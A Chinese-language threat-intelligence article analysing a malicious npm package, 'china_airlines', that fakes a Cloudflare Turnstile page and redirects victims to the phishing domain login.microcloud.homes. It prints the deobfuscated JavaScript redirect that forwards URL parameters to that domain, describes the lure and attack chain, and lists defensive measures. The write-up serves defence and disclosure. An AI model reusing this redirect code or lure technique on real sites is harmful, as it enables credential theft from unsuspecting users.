---
title: Npm 恶意包 china_airlines 伪装 Cloudflare 页面，定向钓鱼窃取用户凭证
url: https://mp.weixin.qq.com/s/j9HvGNvFH9hO-8wiT-N6Jg
source: Doonsec's feed
date: 2026-07-12
fetch_date: 2026-07-13T05:29:55.875354
---

# Npm 恶意包 china_airlines 伪装 Cloudflare 页面，定向钓鱼窃取用户凭证

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0LGiaGIrzXukEfJHSdkjqBCY3XicA9C9FsLwcUgelmWNOo7vRsqnBSLCAEvm5XGw4pfLNvy99TlE7q4VA2sjIFC6DyIXJSdiaZt5pkIibURdgeQ/0?wx_fmt=jpeg)

# Npm 恶意包 china\_airlines 伪装 Cloudflare 页面，定向钓鱼窃取用户凭证

原创

Z
Z

威胁情报Z分析

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

一、事件概述

近日，npm 平台出现一款名为 china\_airlines（版本 1.0.0）的新型恶意包，该包于 2026 年 7 月 2 日首次发布，无任何合法依赖，仅包含伪装成 Cloudflare 人机验证页面的恶意 HTML 与混淆 JavaScript 代码。攻击者通过冒用知名航空公司品牌进行社会工程学诱导，最终将用户跳转至钓鱼站点 login.microcloud.homes，意图窃取敏感登录凭证。

![](https://mmbiz.qpic.cn/mmbiz_png/0LGiaGIrzXulWkbDsE8gzqnhuz4NLN3Ww0pibMxz6piazb950WcsV1VLABjQpMU74y55qYZKQgpOsTXq7pagibQ4Xr9yyFbF2AJFmJOJZ7f6VHc/640?wx_fmt=png&from=appmsg)

二、样本技术分析

1. 包基本信息

* 包名：china\_airlines
* 版本：1.0.0
* 维护者：henryp52uflores
* 发布时间：2026-07-02
* 体积：25 KB（仅包含 2 个文件）
* 特征：无声明依赖，周下载量数据不可用，属于典型 “一次性” 恶意分发包。

2. 伪装页面与混淆脚本

恶意包核心为一个仿 Cloudflare 安全验证页面的 HTML 文件，页面底部嵌入高度混淆的 JavaScript 代码，通过十六进制变量名与字符串拆分实现反分析。经反混淆还原后，核心逻辑仅 7 行：

```
function onTurnstileComplete(token) {  const targetUrl = new URL("https://login.microcloud.homes/");  new URLSearchParams(window.location.search).forEach((_0x8ebd52, _0x5d14e5) => {    targetUrl.searchParams.append(_0x5d14e5, _0x8ebd52);  });  window.location.replace(targetUrl.toString());}
```

![](https://mmbiz.qpic.cn/mmbiz_png/0LGiaGIrzXuncL9iamOJdjNnNo6Oia5YQky576n7FSskUVPicNfwCIHobVNOia7AaicwIZE3kbfXtTYoUQruTAt6sE5zJAbqg9ONcVqYt9NBfsLJ0/640?wx_fmt=png&from=appmsg)

* 脚本劫持 Cloudflare Turnstile 验证完成回调，将用户当前页面的所有 URL 参数拼接后，强制跳转至钓鱼域名 login.microcloud.homes。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0LGiaGIrzXunLTNpF2afCUicMRctcJKyNpriaftDYXtfSemshlYyOLG8GqP5OTPicYriay18GbjE9J4ibwZf2Xmnh7NkKsozeOV68ODgKa31jfvHk/640?wx_fmt=png&from=appmsg)

* 伪装页面包含动态生成的 Ray ID 与 Cloudflare 品牌标识，极具迷惑性，易让用户误以为是正常安全验证流程。

![](https://mmbiz.qpic.cn/mmbiz_png/0LGiaGIrzXultH8sKiapom8DqPXMxxtOzfEDjQicavIHTvlYAFp3vKW5j6eaTJq791zk3WibnpNYLDkmUoS9HM7vhWaQZYweHwibEgY5pYT54v04/640?wx_fmt=png&from=appmsg)

3. 攻击链路

1. 分发阶段：攻击者将恶意包上传至 npm，利用 china\_airlines（中华航空）这一知名品牌名称，诱导开发者或用户下载安装。
2. 加载阶段：用户执行包内代码后，浏览器加载仿 Cloudflare 验证页面，完成人机验证。
3. 跳转阶段：验证完成后，混淆脚本触发，将用户无感知跳转至钓鱼站点 login.microcloud.homes。
4. 窃取阶段：钓鱼站点伪装成目标服务登录页，诱导用户输入账号密码等敏感信息，完成凭证窃取。

三、威胁影响与风险评估

社会工程学风险：冒用航空公司品牌名称，结合 Cloudflare 验证页面伪装，大幅提升用户信任度，钓鱼成功率极高。

凭证窃取风险：最终跳转的钓鱼站点 login.microcloud.homes 大概率为仿冒登录页面，可直接窃取用户账号、密码、二次验证码等核心敏感信息。

供应链风险：npm 平台作为主流前端包管理仓库，该恶意包若被误引入项目，将导致企业级应用用户批量暴露于钓鱼风险。

四、处置建议

1. 终端用户防护

警惕来源不明的 npm 包，尤其是近期发布、下载量极低且无依赖的包。

访问登录页面时，仔细核对域名真实性，避免点击自动跳转的陌生链接。

开启浏览器域名高亮与安全提示功能，及时识别钓鱼站点。

2. 企业安全运营

在 npm 镜像或私有仓库中添加拦截规则，封禁 china\_airlines 及维护者 henryp52uflores 相关包。

部署 WAF/EDR 设备，添加对 login.microcloud.homes 域名的访问拦截规则。

开展开发者安全培训，强调 npm 包安全审计与供应链风险意识。

3. 平台方处置

建议 npm 平台对 china\_airlines 包执行下架处理，并对维护者 henryp52uflores 账号进行风险排查。

加强对冒用知名品牌名称的新包审核力度，提升恶意包前置识别能力。

五、总结

本次 china\_airlines 恶意包事件是典型的npm 供应链钓鱼攻击，攻击者通过品牌冒用与页面伪装，降低用户警惕性，最终实现凭证窃取。安全团队需持续关注 npm 平台新型恶意包分发趋势，加强供应链安全管控，避免此类攻击造成企业与用户数据泄露。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/0wJVoTDXBBkc5vFwntXsAd8nDxmDyBf0Z76ENz1lEx3EmN3upgBOvJOHKylGVwXH7KCZSXduJAuoib2MvH9Hyww/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过